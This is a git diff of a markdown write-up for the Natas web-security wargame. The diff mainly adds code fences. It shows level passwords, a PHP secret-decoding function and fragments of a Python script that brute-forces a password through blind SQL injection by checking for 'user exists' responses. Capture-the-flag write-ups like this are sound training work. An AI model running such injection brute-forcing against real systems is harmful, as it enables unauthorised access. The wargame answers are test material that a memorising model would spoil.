@@ -50,9 +50,11 @@ Password:a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
 **Natas-8**
 
 \*Decoded the encoded secret by using this function:
+```
 function decodeSecret($encoded) 
 { return base64\_decode(strrev(hex2bin($encoded)));
 }
+```
 PasswordSda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
 
 **Natas-9**
@@ -97,15 +99,14 @@ which makes it true and shows the password.
 \*From source code we can know that the pass is stored in users relation which has username and password as columns.
 \*So used SQL injection by running an py code.
 
-—---------------—-------------------------------------------------------------------------------------
 
 #!/usr/bin/env python
 \# -\* coding: utf-8 --
 
-
+```
 import requests
- import re
- from string import ascii\_lowercase, ascii\_uppercase, digits
+import re
+from string import ascii\_lowercase, ascii\_uppercase, digits
 characters = ascii\_lowercase + ascii\_uppercase + digits
 print(characters)
 
@@ -123,9 +124,6 @@ while True:
         if 'user exists' in content:
             seen\_password.append(ch)
               break
-
-
-—------------------------------------------------------------------------------------------------------------
-
+```
 Password:RD7iZrd5gATjj9PkPEuaOlfEjHqj32V
 
